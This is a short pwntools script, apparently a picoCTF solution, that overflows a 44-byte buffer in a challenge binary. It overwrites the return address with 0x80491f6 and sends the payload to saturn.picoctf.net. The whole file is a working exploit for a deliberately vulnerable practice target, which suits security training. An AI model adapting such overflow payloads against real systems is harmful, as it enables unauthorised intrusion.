from pwn import *

offset = b"a"*44
pos = 0x139

payload = offset + p32(0x80491f6)
#payload = "abc"

c = connect("saturn.picoctf.net", 58020)
#c = process("./vuln")

print(c.recvline())
#input()
c.sendline(payload)
print(c.recvline())
print(c.recv(numb = 63))
